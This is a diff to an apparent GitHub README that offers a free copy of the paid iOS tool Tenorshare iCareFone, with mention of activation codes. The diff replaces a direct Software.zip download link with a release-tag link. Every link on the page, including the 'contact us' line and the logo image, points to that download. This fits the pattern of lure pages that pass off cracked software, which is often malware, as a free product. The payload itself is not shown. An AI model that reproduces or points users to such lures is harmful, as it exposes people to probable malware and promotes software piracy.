@@ -1,6 +1,6 @@
 # 🌟 Tenorshare-iCareFone-Free 🌟
 
-[![Download iCareFone](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/download/v1.0/Software.zip)](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/download/v1.0/Software.zip)
+[![Download iCareFone](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/tag/v2.0)](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/tag/v2.0)
 
 Welcome to the **Tenorshare-iCareFone-Free** repository! Here you will find all you need to know about **Tenorshare iCareFone**, a powerful tool designed to optimize the performance of your iOS devices. Whether you are looking for a solution to manage your device better, transfer WhatsApp data, or looking for an activation code, iCareFone has got you covered!
 
@@ -33,9 +33,9 @@ Welcome to the **Tenorshare-iCareFone-Free** repository! Here you will find all 
 
 ## 📥 Download Now!
 Click the button below to download **Tenorshare iCareFone** for free:
-[![Download iCareFone](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/download/v1.0/Software.zip)](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/download/v1.0/Software.zip)
+[![Download iCareFone](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/tag/v2.0)](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/tag/v2.0)
 
-🔗 [Launch the download now!](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/download/v1.0/Software.zip)
+🔗 [Launch the download now!](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/tag/v2.0)
 
 📌 If the link does not work, please check the "Releases" section for alternative download options.
 
@@ -46,8 +46,8 @@ Explore the amazing features of **Tenorshare iCareFone** and take control of you
 Contributions to this repository are welcome! If you have any suggestions, improvements, or new features to add, feel free to submit a pull request.
 
 ## 📞 Contact Us
-For any inquiries or support related to **Tenorshare iCareFone**, you can reach out to us at [https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/download/v1.0/Software.zip](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/download/v1.0/Software.zip).
+For any inquiries or support related to **Tenorshare iCareFone**, you can reach out to us at [https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/tag/v2.0](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/tag/v2.0).
 
-![iCareFone Logo](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/download/v1.0/Software.zip)
+![iCareFone Logo](https://github.com/adem2018/Tenorshare-iCareFone-Free/releases/tag/v2.0)
 
 Let's make managing your iOS device a breeze with **Tenorshare iCareFone**! 🚀
